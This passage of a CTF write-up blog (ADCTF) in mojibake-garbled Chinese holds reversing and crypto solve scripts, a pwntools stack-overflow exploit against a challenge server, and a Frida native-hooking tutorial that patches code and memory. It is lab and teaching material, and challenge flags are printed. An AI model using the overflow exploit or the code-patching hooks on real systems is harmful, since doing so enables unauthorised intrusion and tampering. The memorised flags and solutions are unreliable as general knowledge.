aes_decrypted.decode(\u0026#39;utf-8\u0026#39;) return decrypted_flag # è¾“å…¥ä½ çš„ aesKey å’Œ xorKeyï¼Œä»¥åŠå·²çŸ¥çš„ Base64 åŠ å¯†åçš„æ•°æ® aes_key = bytes([62, 107, 51, 121, 49, 95, 102, 48, 114, 95, 122, 64, 107, 48, 60, 51]) # AES key xor_key = b\u0026#39;z@k0f1ndth3key2w\u0026#39; # XOR keyï¼ˆå¯ä»¥æ˜¯ä»»æ„å­—èŠ‚æ•°ç»„ï¼‰ encrypted_data_base64 = \u0026#39;qpuQkUPI8knvxgK5U0UwKCrrQeOxdY8H6YKuzcD05OKatSh0UCg8+xDIxsbppDNaY3Eflx0Va8F/7wKxVrI8Qgq0vH4BUGXBDc1fSNUww5Y=\u0026#39; # å¡«å…¥ä»C#ç¨‹åºä¸­è·å–åˆ°çš„åŠ å¯†æ•°æ®çš„Base64å­—ç¬¦ä¸² # è°ƒç”¨è§£å¯†å‡½æ•° decrypted_flag = main(aes_key, xor_key, encrypted_data_base64) print(f\u0026#34;è§£å¯†åçš„ flag: {decrypted_flag}\u0026#34;) # flag{U_r_r33lly_tAl3nted_At_r3ve3s3_aNA1yz1ng!!!_p@ch1!!!nyA!!!} what!why!!! DIEæŸ¥å£³ï¼Œå‘ç°upxå£³ç›´æ¥upx -dè„±å£³\nmainå‡½æ•°ç›´æ¥å°±æ˜¯åŠ å¯†é€»è¾‘ï¼Œå¤§æ¦‚å°±æ˜¯64å­—èŠ‚çš„æ•°æ®ï¼Œæ¯å››ä¸ªä¸ºä¸€ç»„è¿›è¡Œå¤„ç†è¿™é‡Œv6çš„å€¼å¹¶æ²¡æœ‰æ˜¾å¼ç»™å‡ºæ¥ï¼Œä½†æ˜¯çœ‹æ±‡ç¼–èƒ½çŸ¥é“æ˜¯sçš„é¦–åœ°å€+64ï¼Œå°±æ˜¯sçš„æœ€åä¸€ä¸ªå­—èŠ‚çš„åœ°å€ï¼Œå°è¯•å†™äº†expä½†æ˜¯ç»“æœéƒ½ä¸å¯¹ï¼Œå¥‡æ€ªçš„æ˜¯å‰4ä¸ªå­—èŠ‚æ˜¯flagï¼Œä½†æ˜¯åé¢çš„éƒ½ä¸å¯¹ï¼ŒçŒœæµ‹ç¨‹åºåœ¨ç¬¬ä¸€ç»„å­—èŠ‚åŠ å¯†è¿‡åå¯¹è¿‡ç¨‹è¿›è¡Œäº†ä¿®æ”¹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;time.h\u0026gt; int main() { unsigned char input[64] = { 0x87, 0xE9, 0x72, 0x0E, 0x1F, 0x57, 0xEC, 0x0C, 0xE9, 0x9C, 0xC0, 0x5E, 0x25, 0x32, 0xCD, 0x1F, 0xC0, 0x16, 0x31, 0x2B, 0xA5, 0xDC, 0x91, 0x71, 0xE0, 0x1F, 0xA3, 0x01, 0x6A, 0x1D, 0x6F, 0x55, 0x77, 0x1B, 0x0E, 0x33, 0xB7, 0xD0, 0xDE, 0x24, 0x3B, 0xCF, 0xAC, 0x64, 0xE3, 0x80, 0x7B, 0x3B, 0x62, 0xE4, 0x33, 0x1C, 0xCA, 0xBF, 0xAC, 0x5F, 0xF0, 0x9F, 0xB1, 0x0E, 0xCE, 0x40, 0xEE, 0x64 }; unsigned int i, j; unsigned int rand_value; unsigned int seed = 0xD000721; srand(seed); for (i = 0; i \u0026lt; 16; i++) { rand_value = rand(); for (j = 0; j \u0026lt; 4; j++) { input[4 * i + j] ^= rand_value; rand_value \u0026gt;\u0026gt;= 8; } seed = rand(); srand(seed); } for (int i = 0; i \u0026lt; 64; i++) { printf(\u0026#34;%x\u0026#34;, input[i]); } return 0; } è¿™æ˜¯ä¸€å¼€å§‹å†™çš„expï¼Œä¸å¯¹ï¼Œé‡æ–°å¯¹ç¨‹åºåˆ†æï¼Œåœ¨åŠ¨è°ƒçš„æ—¶å€™å‘ç°ç¨‹åºè°ƒç”¨sleep(60)çš„æ—¶å€™ä¼šä¸€ç›´å¤„äºsleepçŠ¶æ€ä¸è·³å‡ºï¼Œåº”è¯¥æ˜¯å¯¹sleepè¿›è¡Œäº†ä¿®æ”¹ï¼ŒæŸ¥çœ‹sleepçš„äº¤å‰å¼•ç”¨\nå‘ç°å¯ç–‘å‡½æ•°\nåœ¨æœ€ä¸‹é¢å¯¹sleepå‡½æ•°å’Œsrandå‡½æ•°éƒ½è¿›è¡Œäº†æ“ä½œï¼ŒæŸ¥çœ‹sub_4012C7å‡½æ•°\nå‘ç°è°ƒç”¨äº†ä¸¤æ¬¡mprotectå‡½æ•°ä¿®æ”¹äº†å‚æ•°a1çš„å†…å­˜è¯»å†™æƒé™ï¼Œå¤§æ¦‚å¯ä»¥çŒœåˆ°å°±æ˜¯è¿™é‡Œå¯¹sleepå’Œsrandå‡½æ•°è¿›è¡Œäº†ä¿®æ”¹ï¼Œè™½ç„¶çŸ¥é“äº†srandå‡½æ•°è¢«ä¿®æ”¹äº†ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¼ è¿›æ¥çš„ç¬¬äºŒä¸ªçš„å‚æ•°æœ‰ä»€ä¹ˆç”¨ï¼Œç„¶ååœ¨æ±‡ç¼–é‡Œé¢ä¹±ç¿»ç¿»åˆ°äº†ä¸€ä¸ªæœªå®šä¹‰çš„å‡½æ•°(çº¯è¿qaq)\nçœ‹æ±‡ç¼–èƒ½çœ‹åˆ°ç†Ÿæ‚‰çš„æ•°å­—0x0D000721(seed)ï¼Œå¯ä»¥æ ¹æ®æ±‡ç¼–çŒœæµ‹å°±æ˜¯å½“seed!=0x0D000721çš„æ—¶å€™ä¼šæ‰§è¡Œseed^=0x7A71571,æ‰€ä»¥mainå‡½æ•°çš„åŠ å¯†è¿‡ç¨‹æ˜¯ä¸å®Œæ•´çš„ï¼Œç»è¿‡ä¿®æ”¹çš„expå¦‚ä¸‹(è¯·åœ¨linuxç¯å¢ƒä¸‹è¿è¡Œ)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;time.h\u0026gt; int main() { unsigned char input[64] = { 0x87, 0xE9, 0x72, 0x0E, 0x1F, 0x57, 0xEC, 0x0C, 0xE9, 0x9C, 0xC0, 0x5E, 0x25, 0x32, 0xCD, 0x1F, 0xC0, 0x16, 0x31, 0x2B, 0xA5, 0xDC, 0x91, 0x71, 0xE0, 0x1F, 0xA3, 0x01, 0x6A, 0x1D, 0x6F, 0x55, 0x77, 0x1B, 0x0E, 0x33, 0xB7, 0xD0, 0xDE, 0x24, 0x3B, 0xCF, 0xAC, 0x64, 0xE3, 0x80, 0x7B, 0x3B, 0x62, 0xE4, 0x33, 0x1C, 0xCA, 0xBF, 0xAC, 0x5F, 0xF0, 0x9F, 0xB1, 0x0E, 0xCE, 0x40, 0xEE, 0x64 }; unsigned int i, j; unsigned int rand_value; unsigned int seed = 0xD000721; srand(seed); for (i = 0; i \u0026lt; 16; i++) { rand_value = rand(); for (j = 0; j \u0026lt; 4; j++) { input[4 * i + j] ^= rand_value; rand_value \u0026gt;\u0026gt;= 8; } seed = rand(); if(seed != 0xD000721) seed ^= 0x7A71571;\t//srandè¢«ä¿®æ”¹ä¹‹åçš„åŠ å¯†é€»è¾‘ srand(seed); } for (int i = 0; i \u0026lt; 64; i++) { printf(\u0026#34;%x\u0026#34;, input[i]); } return 0; } //flag{kR@z1!!!y0U_3M1nent1y_g0o0od_aT_n0t_b3iNg_r1kr0lled_0rz!!!} Do you like Kotone? apkæ–‡ä»¶ï¼Œjadxæ‰“å¼€ï¼Œæ‰¾åˆ°mainactivityç±»\nå¯¹ç”¨æˆ·è¾“å…¥åˆ¤æ–­çš„åœ°æ–¹æ˜¯è°ƒç”¨äº†checkerç±»çš„checkFlagæ–¹æ³•ï¼Œè·Ÿè¿›å»çœ‹çœ‹\nå¯ä»¥çœ‹åˆ°åœ¨checkflagæ–¹æ³•ä¸­è°ƒç”¨äº†nativeå±‚ezandroid.soæ–‡ä»¶çš„checkæ–¹æ³•ï¼Œè§£å‹apkæ–‡ä»¶æ‰¾åˆ°å¯¹åº”soæ–‡ä»¶æ‰“å¼€\nsoå±‚å°±æ˜¯å®ç°äº†ä¸€ä¸ªæ ‡å‡†çš„rc4åŠ å¯†ï¼Œè¿™é‡Œå°±ä¸èµ˜è¿°ï¼Œæå–å‡ºå¯†æ–‡å³å¯ï¼Œrc4çš„keyåœ¨Javaå±‚ä¼ å‚çš„æ—¶å€™å°±å·²ç»™å‡º\næµç¨‹å°±æ˜¯base64-\u0026gt;rc4ï¼Œå…¶ä¸­base64è¿›è¡Œäº†æ¢è¡¨æ“ä½œï¼Œè·Ÿè¿›tableå˜é‡å¯ä»¥åœ¨string.xmlæ–‡ä»¶ä¸­æ‰¾åˆ°tableçš„å€¼\n89YdTR+PB67i0HaqGJWp4FtcL5Oufle/AVNDS3IxwzCn12mUskZjhrKoyvMXgEbQ\nå°è¯•è§£å¯†ä¼šå¤±è´¥ï¼Œå›åˆ°Javaå±‚çš„base64ï¼Œæ ¹æ®å‡½æ•°åæç¤ºå¯èƒ½base64åšäº†é­”æ”¹ï¼Œè¦é‡æ–°çœ‹base64çš„é€»è¾‘ï¼Œbase64æ¯æ¬¡å»ä¸‰ä¸ªå­—èŠ‚çš„æ•°æ®ï¼Œæœ€åä¼šå‡ºç°4ä¸ªå­—èŠ‚çš„å¯†æ–‡ï¼Œå…ˆå–ç¬¬ä¸€ä¸ªå­—èŠ‚çš„ä½6ä½å¹¶é€šè¿‡æŸ¥è¡¨ç”Ÿæˆç¬¬ä¸€ä¸ªå­—èŠ‚çš„å¯†æ–‡ï¼Œæ¥ç€å–ç¬¬ç¬¬äºŒä¸ªå­—èŠ‚çš„ä½4ä½å’Œä¸€ä¸ªå­—èŠ‚çš„é«˜2ä½æ‹¼åœ¨ä¸€èµ·å¾—åˆ°ç¬¬äºŒä¸ªå­—èŠ‚å¯†æ–‡ï¼Œå†å–ç¬¬äºŒä¸ªå­—èŠ‚é«˜2ä½å’Œç¬¬ä¸‰ä¸ªå­—èŠ‚ä½4ä½ç»„æˆç¬¬ä¸‰ä¸ªå­—èŠ‚å¯†æ–‡ï¼Œå†å–ç¬¬ä¸‰ä¸ªå­—èŠ‚çš„ä½2ä½å’Œç¬¬äºŒä¸ªå­—èŠ‚çš„é«˜4ä½æ‹¼æˆç¬¬ä¸‰ä¸ªå­—èŠ‚å¯†æ–‡ï¼Œæœ€åå–ç¬¬ä¸‰ä¸ªå­—èŠ‚çš„é«˜6ä½ç»„æˆç¬¬å››ä¸ªå­—èŠ‚å¯†æ–‡ï¼Œå¦‚æœæ˜æ–‡çš„å­—èŠ‚æ•°ä¸æ˜¯3çš„å€æ•°å°±ç¼ºå‡ ä¸ªå­—èŠ‚å¡«å‡ ä¸ª\u0026quot;=\u0026quot;ï¼Œè§£å¯†å°±è·Ÿç€è¿™ä¸ªè¿‡ç¨‹é€†ç€å†™å°±è¡Œ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 data = \u0026#34;IktLx2oWUJP0aFKck0ocZF+G634e/24Go94OzrP8\u0026#34; #æœ€åä¸€ä¸ªå­—èŠ‚æ˜¯\u0026#39;=\u0026#39;ï¼Œæ”¹æˆtable[0]è¿™æ ·ä¸ä¼šå½±å“è§£ç è¿‡ç¨‹ table = \u0026#34;89YdTR+PB67i0HaqGJWp4FtcL5Oufle/AVNDS3IxwzCn12mUskZjhrKoyvMXgEbQ\u0026#34; table_dict = {char: idx for idx, char in enumerate(table)} flag = \u0026#34;\u0026#34; for i in range(0, len(data), 4): ch1 = table_dict[data[i]] ch2 = table_dict[data[i+1]] ch3 = table_dict[data[i+2]] ch4 = table_dict[data[i+3]] part1 = ch1 | ((ch2 \u0026amp; 3) \u0026lt;\u0026lt; 6) part2 = ((ch2 \u0026amp; 0x3c) \u0026gt;\u0026gt; 2) | ((ch3 \u0026amp; 0xf) \u0026lt;\u0026lt; 4) part3 = ((ch3 \u0026amp; 0x30) \u0026gt;\u0026gt; 4) | (ch4 \u0026lt;\u0026lt; 2) flag += chr(part1) flag += chr(part2) flag += chr(part3) print(flag) #flag{Kot0Ne_1s_re@IIy_KAw@ii} Crypto Too_Close_To_Sqrt æˆ‘åšå‡ºæ¥çš„å¯†ç é¢˜éƒ½æ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œç½‘ä¸Šæ‰¾çš„è„šæœ¬\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 from Crypto.Util.number import * import sympy # n å’Œ c çš„å€¼ n = 77110253337392483710762885851693115398718726693715564954496625571775664359421696802771127484396119363821442323280817855193791448966346325672454247192244603281463595140923987182065095198239715749980911991399313395478292871386248479783966672279960117003211050451721307589036878362258617072298763845707881171743025954660306653186069633961424298647787491228085801739935823867940079473418881721402983930102278146132444200918211570297746753023639071980907968315022004518691979622641358951345391364430806558132988012728594904676117146959007388204192026655365596585273466096578234688721967922267682066710965927143418418189061 c = 702169486130185630321527556026041034472676838451810139529487621183247331904842057079283224928768517113408797087181581480998121028501323357655408002432408893862758626561073997320904805861882437888050151254177440453995235705432462544064680391673889537055043464482935772971360736797960328738609078425683870759310570638726605063168459207781397030244493359714270821300687562579988959673816634095712866030123140597773571541522765682883740928146364852979096568241392987132397744676804445290807040450917391600712817423804313823998912230965373385456071776639302417042258135008463458352605827748674554004125037538659993074220 # ä½¿ç”¨ sympy çš„ factorint() æ¥å› å¼åˆ†è§£ n factors = sympy.ntheory.factorint(n) # æ‰“å°å› æ•°ï¼ŒæŸ¥çœ‹å“ªäº›æ˜¯ p å’Œ q print(factors) # è·å– p å’Œ qï¼ˆåœ¨ RSA ä¸­ï¼Œn = p * qï¼‰ # å‡è®¾ n åªåŒ…å«ä¸¤ä¸ªè´¨å› æ•° p å’Œ q p = list(factors.keys())[0] q = list(factors.keys())[1] # è®¡ç®— Ï†(n) phi_n = (p - 1) * (q - 1) # è®¡ç®— dï¼Œd æ˜¯ e çš„æ¨¡ Ï†(n) é€†å…ƒ e = 65537 d = pow(e, -1, phi_n) # è§£å¯†å¯†æ–‡ c m = pow(c, d, n) # å°† m è½¬æ¢ä¸ºå­—èŠ‚å¹¶æ˜¾ç¤º flag = long_to_bytes(m) print(flag.decode()) #flag{oops_the_N_is_not_secure} One_Key_Pad é€»è¾‘å°±æ˜¯flag^keyï¼Œç»™å‡ºäº†å¯†æ–‡ï¼Œå¹¶ä¸”å·²çŸ¥å‰5ä¸ªå­—èŠ‚ä¸ºflag{ ç›´æ¥çˆ†ç ´keyå³å¯\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 # çˆ†ç ´å’Œè§£å¯†è„šæœ¬ # å·²çŸ¥çš„æ˜æ–‡å‰äº”ä¸ªå­—èŠ‚ï¼š\u0026#39;flag{\u0026#39; plaintext = [ord(c) for c in \u0026#34;flag{\u0026#34;] # è½¬æ¢ä¸ºå­—èŠ‚åºåˆ— [102, 108, 97, 103, 123] # å¯†æ–‡çš„å‰äº”ä¸ªå­—èŠ‚ ciphertext = bytes.fromhex(\u0026#34;e0eae7e1fde3e7fcffd9fee9f4fb\u0026#34;)[:5] # æå–å¯†æ–‡å‰äº”ä¸ªå­—èŠ‚ # æ­¥éª¤ 1: çˆ†ç ´å¯†é’¥ key = [] for p, c in zip(plaintext, ciphertext): key.append(p ^ c) # æ‰“å°å‡ºçˆ†ç ´å¾—åˆ°çš„å¯†é’¥ print(f\u0026#34;çˆ†ç ´å‡ºçš„key: {key}\u0026#34;) # æ­¥éª¤ 2: è§£å¯†æ•´ä¸ªå¯†æ–‡ ciphertext_full = bytes.fromhex(\u0026#34;e0eae7e1fde3e7fcffd9fee9f4fb\u0026#34;) # å®Œæ•´å¯†æ–‡ # è§£å¯†è¿‡ç¨‹ plaintext_full = [] for i in range(len(ciphertext_full)): plaintext_full.append(ciphertext_full[i] ^ key[i % len(key)]) # è¾“å‡ºè§£å¯†åçš„æ˜æ–‡ try: print(\u0026#34;è§£å¯†åçš„æ˜æ–‡:\u0026#34;, bytes(plaintext_full).decode()) except UnicodeDecodeError: print(\u0026#34;è§£å¯†åçš„æ˜æ–‡åŒ…å«éæ‰“å°å­—ç¬¦ï¼Œæ— æ³•ç›´æ¥æ˜¾ç¤ºã€‚\u0026#34;) print(\u0026#34;è§£å¯†åçš„å­—èŠ‚ä¸²:\u0026#34;, bytes(plaintext_full)) #flag{eazy_xor} Pwn ret2text IDAæ‰“å¼€é™„ä»¶\nä½†æ˜¯ç®€å•çš„æ ˆæº¢å‡ºï¼Œç¨‹åºä¼šé™åˆ¶readå‡½æ•°è¯»å…¥çš„å­—èŠ‚æ•°å°äº96ï¼Œä½†æ˜¯nbytesç”±æˆ‘ä»¬è¾“å…¥ï¼Œæ‰€ä»¥åªè¦è¾“å…¥-1é€ æˆæ•´æ•°æº¢å‡ºå³å¯ï¼Œåé¢å°±æ ¹æ®æ ˆç©ºé—´å¡«payloadåˆ°returnçš„åœ°å€ï¼Œç„¶åæ¢æˆåé—¨çš„åœ°å€å³å¯ï¼Œexpå¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 from pwn import * import time context(log_level = \u0026#39;debug\u0026#39;) host = \u0026#39;120.76.118.202\u0026#39; port = 33001 io = remote(host, port) io.recvuntil(b\u0026#34;Type your passphrase:\u0026#34;) io.sendline(b\u0026#34;115c79a11142301a2c418f7c689f188e\u0026#34;) #io.recvuntil(b\u0026#34;Anyway,how old are you now\u0026gt;\u0026#34;) time.sleep(1) io.sendline(b\u0026#39;-1\u0026#39;) padding = 0x68 return_addr = 0x400624 payload = b\u0026#39;a\u0026#39; * padding + p64(return_addr) #io.recvuntil(b\u0026#34;So what are you going to say?\\n\u0026#34;) io.sendline(payload) io.interactive() #flag{668c6131-3680-438b-aacd-f76c5cede90e} ","date":"2025-01-01T13:49:19+08:00","image":"https://jeremiah.oss-cn-shenzhen.aliyuncs.com/picture/202501011926932.png","permalink":"http://www.j3r3m14h.com.cn/Je2em1ah_blog/p/adctf/","title":"ADCTF"},{"content":"Frida Hook so æšä¸¾å„ç§ 1. æšä¸¾å¯¼å…¥è¡¨ é€šè¿‡æšä¸¾å¯¼å…¥è¡¨ï¼Œå¯ä»¥è·å–å‡ºç°åœ¨å¯¼å…¥è¡¨ä¸­çš„å‡½æ•°åœ°å€ã€‚\n1 2 3 4 5 6 7 8 var imports = Module.enumerateImports(\u0026#34;libxxx.so\u0026#34;); for (var i = 0; i \u0026lt; imports.length; i++) { if (imports[i].name === \u0026#34;strncat\u0026#34;) { console.log(JSON.stringify(imports[i])); console.log(imports[i].address); break; } } 2. æšä¸¾å¯¼å‡ºè¡¨ é€šè¿‡æšä¸¾å¯¼å‡ºè¡¨ï¼Œå¯ä»¥è·å–å‡ºç°åœ¨å¯¼å‡ºè¡¨ä¸­çš„å‡½æ•°åœ°å€ã€‚\n1 2 3 4 var exports = Module.enumerateExports(\u0026#34;libxxx.so\u0026#34;); for (var i = 0; i \u0026lt; exports.length; i++) { console.log(JSON.stringify(exports[i])); } 3. æšä¸¾ç¬¦å·è¡¨ é€šè¿‡æšä¸¾ç¬¦å·è¡¨ï¼Œå¯ä»¥è·å–å‡ºç°åœ¨ç¬¦å·è¡¨ä¸­çš„å‡½æ•°åœ°å€ã€‚\n1 Module.enumerateSymbols(\u0026#34;libxxx.so\u0026#34;); 4. æšä¸¾æ¨¡å—å¹¶è¿›ä¸€æ­¥æšä¸¾å¯¼å‡ºè¡¨ é€šè¿‡æšä¸¾æ¨¡å—ï¼Œå†æšä¸¾æ¨¡å—å†…éƒ¨çš„å¯¼å‡ºè¡¨ï¼Œå¯ä»¥å¿«é€Ÿæ‰¾åˆ°æŸä¸ªå¯¼å…¥å‡½æ•°å‡ºè‡ªå“ªä¸ª SOã€‚\n1 Process.enumerateModules(); 5. è§£æè¡¨ç±»å‹ exports è§£æçš„è¡¨ç±»å‹ä¸º SHT_DYNSYM symbols è§£æçš„è¡¨ç±»å‹ä¸º SHT_SYMTAB SYMTAB æ›´å…¨é¢ï¼ˆDYNSYM æ˜¯ SYMTAB çš„å­é›†ï¼‰ï¼Œä½†å¹¶é SO è¿è¡Œæ‰€å¿…éœ€ï¼Œé€šå¸¸ä¼šè¢«å»æ‰ã€‚\nHook å¯¼å‡ºå‡½æ•° æ­¥éª¤ä¸€ï¼šè·å–å‡½æ•°åœ°å€ åœ¨ SO çš„å¯¼å‡ºè¡¨ä¸­ï¼Œå¯ä»¥é€šè¿‡ Frida æä¾›çš„ API è·å–å‡½æ•°åœ°å€ã€‚\n1 Module.findExportByName(\u0026#34;libxxx.so\u0026#34;, \u0026#34;add\u0026#34;); æ³¨æ„ï¼šå‡½æ•°åä»¥æ±‡ç¼–ä¸­å‡ºç°çš„ä¸ºå‡†ã€‚\næ­¥éª¤äºŒï¼šä½¿ç”¨ Interceptor.attach è¿›è¡Œ Hook è·å–åˆ°å‡½æ•°åœ°å€åï¼Œä½¿ç”¨ Interceptor.attach å¯¹å‡½æ•°è¿›è¡Œ Hookã€‚\n1 2 3 4 5 6 7 8 9 10 Interceptor.attach(Address, { onEnter: function(args){ console.log(args[0]); // æ‰“å°å‚æ•° console.log(this.context.x1); // æ‰“å°å¯„å­˜å™¨å†…å®¹ console.log(args[2].toInt32()); // é»˜è®¤æ˜¾ç¤º16è¿›åˆ¶ï¼Œè¿™é‡Œè½¬æ¢æˆ10è¿›åˆ¶ }, onLeave: function(retval){ console.log(\u0026#34;retval\u0026#34;, retval, retval.toInt32()); } }); æ¨¡å—åŸºå€çš„å‡ ç§è·å–æ–¹å¼ å¯¹äºåœ¨å¯¼å…¥è¡¨ã€å¯¼å‡ºè¡¨ã€ç¬¦å·è¡¨ä¸­æ‰¾ä¸åˆ°çš„å‡½æ•°ï¼Œåœ°å€éœ€è¦è‡ªè¡Œè®¡ç®—ã€‚ è®¡ç®—æ–¹å¼å¾ˆç®€å•ï¼šSO åŸºå€ + å‡½æ•°åœ¨ SO ä¸­çš„åç§»ï¼ˆARM æ¶æ„ä¸‹ Thumb æ¨¡å¼éœ€è¦åŠ  1ï¼‰ã€‚ å› æ­¤ï¼Œé¦–å…ˆéœ€è¦è·å– SO çš„åŸºå€ï¼Œå³æ¨¡å—åŸºå€ã€‚ 1 2 3 4 5 6 7 8 9 10 11 Process.findModuleByName(\u0026#34;libart.so\u0026#34;); Process.getModuleByName(\u0026#34;libc.so\u0026#34;); Module.findBaseAddress(\u0026#34;libart.so\u0026#34;); Process.enumerateModules(); Process.findModuleByAddress(address); Process.getModuleByAddress(address); Hook ä»»æ„å‡½æ•° 1 2 3 4 5 6 7 8 9 10 11 12 13 14 var soAddr = Module.findBaseAddress(\u0026#34;libxxx.so\u0026#34;); console.log(soAddr); var funcAddr = soAddr.add(0x23F4); // ARM Thumb æ¨¡å¼ä¸‹éœ€åŠ  1ï¼ŒARM ä¸éœ€åŠ  console.log(funcAddr); if (funcAddr !== null) { Interceptor.attach(funcAddr, { onEnter: function(args){ // å…¥å‚å¤„ç† }, onLeave: function(retval){ console.log(hexdump(retval)); // è¾“å‡ºå½“å‰åœ°å€çš„åå…­è¿›åˆ¶æ•°æ® } }); } so Hook æ¨¡æ¿ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 function print_arg(addr){ var module = Process.findRangeByAddress(addr); if (module !== null) return hexdump(addr) + \u0026#34;\\n\u0026#34;; return ptr(addr) + \u0026#34;\\n\u0026#34;; } function hook_native_addr(funcPtr){ var module = Process.findModuleByAddress(funcPtr); Interceptor.attach(funcPtr, { onEnter: function(args){ this.logs = []; this.logs.push(\u0026#34;call \u0026#34; + module.name + \u0026#34;!\u0026#34; + ptr(funcPtr).sub(module.base) + \u0026#34;\\n\u0026#34;); this.args0 = args[0]; this.args1 = args[1]; this.logs.push(\u0026#34;this.args0 onEnter: \u0026#34; + print_arg(this.args0)); this.logs.push(\u0026#34;this.args1 onEnter: \u0026#34; + print_arg(this.args1)); }, onLeave: function(retval){ this.logs.push(\u0026#34;this.args0 onLeave: \u0026#34; + print_arg(this.args0)); this.logs.push(\u0026#34;this.args1 onLeave: \u0026#34; + print_arg(this.args1)); this.logs.push(\u0026#34;retval onLeave: \u0026#34; + retval + \u0026#34;\\n\u0026#34;); console.log(this.logs); } }); } ä¿®æ”¹å‡½æ•°æ•°å€¼å‚æ•°å’Œè¿”å›å€¼ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 var addAddr = Module.findExportByName(\u0026#34;libxxx.so\u0026#34;, \u0026#34;add\u0026#34;); console.log(addAddr); if (addAddr !== null) { Interceptor.attach(addAddr, { onEnter: function(args){ args[2] = ptr(1000); // æ–°å€¼ console.log(args[2].toInt32()); }, onLeave: function(retval){ retval.replace(20000); console.log(\u0026#34;retval\u0026#34;, retval.toInt32()); } }); } è·å–æŒ‡é’ˆå‚æ•°è¿”å›å€¼ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 var soAddr = Module.findBaseAddress(\u0026#34;libxxx.so\u0026#34;); console.log(soAddr); var sub_208C = soAddr.add(0x208C); console.log(sub_208C); if (sub_208C !== null) { Interceptor.attach(sub_208C, { onEnter: function(args){ this.args1 = args[1]; }, onLeave: function(retval){ console.log(hexdump(this.args1)); } }); } Hook dlopen æœ‰äº›å‡½æ•°åœ¨ SO é¦–æ¬¡åŠ è½½æ—¶æ‰§è¡Œï¼Œè€Œ SO æœªåŠ è½½å‰æ— æ³•è¿›è¡Œ Hookã€‚ å› æ­¤ï¼Œéœ€ ç›‘æ§ SO çš„åŠ è½½æ—¶æœºï¼Œåœ¨ SO åŠ è½½å®Œæˆåç«‹å³è¿›è¡Œ Hookã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 function hook_dlopen(addr, soName, callback) { Interceptor.attach(addr, { onEnter: function(args){ var name = args[0].readCString(); if (name.indexOf(soName) !== -1) this.hook = true; }, onLeave: function(retval){ if (this.hook) callback(); } }); } var dlopen = Module.findExportByName(null, \u0026#34;dlopen\u0026#34;); var android_dlopen_ext = Module.findExportByName(null, \u0026#34;android_dlopen_ext\u0026#34;); hook_dlopen(dlopen, \u0026#34;libxxx.so\u0026#34;, hookfunc); hook_dlopen(android_dlopen_ext, \u0026#34;libxxx.so\u0026#34;, hookfunc); å†…å­˜è¯»å†™ 1. è¯»å–æŒ‡å®šåœ°å€çš„å­—ç¬¦ä¸² 1 2 var soAddr = Module.findBaseAddress(\u0026#34;libxxx.so\u0026#34;); console.log(soAddr.add(0x2C00).readCString()); 2. Dump æŒ‡å®šåœ°å€çš„å†…å­˜ 1 console.log(hexdump(soAddr.add(0x2C00))); 3. è¯»æŒ‡å®šåœ°å€çš„å†…å­˜ 1 2 console.log(soAddr.add(0x2C00).readByteArray(16)); console.log(Memory.readByteArray(soAddr.add(0x2C00), 16)); // åŸå…ˆçš„ API 4. å†™æŒ‡å®šåœ°å€çš„å†…å­˜ 1 2 soAddr.add(0x2C00).writeByteArray(stringToBytes(\u0026#34;xxxxx\u0026#34;)); console.log(hexdump(soAddr.add(0x2C00))); 5. ç”³è¯·æ–°å†…å­˜å¹¶å†™å…¥ 1 2 Memory.alloc(); Memory.allocUtf8String(); 6. ä¿®æ”¹å†…å­˜æƒé™ 1 Memory.protect(ptr(libso.base), libso.size, \u0026#39;rwx\u0026#39;); Frida ä¿®æ”¹ SO å‡½æ•°ä»£ç  1. ä¿®æ”¹åœ°å€å¯¹åº”çš„æŒ‡ä»¤ 1 2 soAddr = Module.findBaseAddress(\u0026#34;libxxx.so\u0026#34;); soAddr.add(0x1684).writeByteArray(hexToBytes(\u0026#34;0001094B\u0026#34;)); ARM ä¸ Hex åœ¨çº¿è½¬æ¢ï¼šARM Converter\n2. å°†å¯¹åº”åœ°å€çš„æŒ‡ä»¤è§£ææˆæ±‡ç¼– 1 2 var ins = Instruction.parse(soAddr.add(0x1684)); console.log(ins.toString()); 3. ä½¿ç”¨ Frida æä¾›çš„ API å†™æ±‡ç¼–ä»£ç  1 2 new Arm64Writer(soAddr.add(0x167C)).putNop(); console.log(Instruction.parse(soAddr.add(0x167C)).toString()); 4. ä½¿ç”¨ Frida æä¾›çš„ API å†™æ±‡ç¼–ä»£ç  1 2 3 4 5 6 7 8 var codeAddr = soAddr.add(0x167C); Memory.patchCode(codeAddr, 8, function (code) { var writer = new Arm64Writer(code, { pc: codeAddr }); writer.putBytes(hexToBytes(\u0026#34;0001094B\u0026#34;)); writer.putBytes(hexToBytes(\u0026#34;FF830091\u0026#34;)); writer.putRet(); writer.flush(); }); SO å±‚ä¸»åŠ¨è°ƒç”¨ä»»æ„å‡½æ•° 1. å£°æ˜å‡½æ•°æŒ‡é’ˆ æ–‡æ¡£ï¼šFrida JavaScript API - NativeFunction\nè¯­æ³•ï¼šnew NativeFunction(address, returnType, argTypes[, abi])\næ”¯æŒçš„ returnType å’Œ argTypesï¼š\nåŸºæœ¬ç±»å‹ï¼švoidã€pointerã€intã€uintã€longã€ulongã€charã€ucharã€floatã€double å®šé•¿æ•´æ•°ï¼šint8ã€uint8ã€int16ã€uint16ã€int32ã€uint32ã€int64ã€uint64ã€bool å¤§å°ç±»å‹ï¼šsize_tã€ssize_t 2. ä»£ç 